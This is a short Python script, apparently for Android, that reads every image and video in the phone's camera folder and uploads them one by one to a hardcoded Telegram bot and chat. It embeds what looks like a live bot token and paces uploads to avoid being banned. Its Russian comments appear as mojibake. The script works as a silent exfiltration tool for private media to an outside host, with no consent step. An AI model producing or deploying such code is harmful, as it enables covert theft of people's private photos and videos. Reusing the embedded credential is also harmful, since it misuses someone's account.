import os
import requests
import time

# === –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ===
BOT_TOKEN = "7062038688:AAHMVNwtLwxdybRw1mogJaVOKKR8KWHjMJ0"
CHAT_ID = "6227457637"
FOLDER_PATH = "/storage/emulated/0/DCIM/Camera"

def send_files():
    count = 0
    for filename in os.listdir(FOLDER_PATH):
        file_path = os.path.join(FOLDER_PATH, filename)

        if filename.lower().endswith((".jpg", ".jpeg", ".png")):
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            files = {"photo": open(file_path, "rb")}
        elif filename.lower().endswith((".mp4", ".mov")):
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
            files = {"video": open(file_path, "rb")}
        else:
            continue

        try:
            response = requests.post(url, files=files, data={"chat_id": CHAT_ID})
            if response.status_code == 200:
                print(f"‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {filename}")
                count += 1
            elif response.status_code == 429:
                print("‚è≥ –°–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–æ–≤. –ñ–¥—ë–º 5 —Å–µ–∫—É–Ω–¥...")
                time.sleep(5)
            else:
                print(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ {filename}: {response.status_code}")
        except Exception as e:
            print(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ {filename}: {str(e)}")
        
        time.sleep(1)  # –ü–∞—É–∑–∞ –º–µ–∂–¥—É —Ñ–∞–π–ª–∞–º–∏ (—á—Ç–æ–±—ã –Ω–µ –ø–æ–ª—É—á–∏—Ç—å –±–∞–Ω)

    print(f"üì¶ –í—Å–µ–≥–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {count} —Ñ–∞–π–ª–æ–≤")

# === –ó–∞–ø—É—Å–∫ ===
send_files()
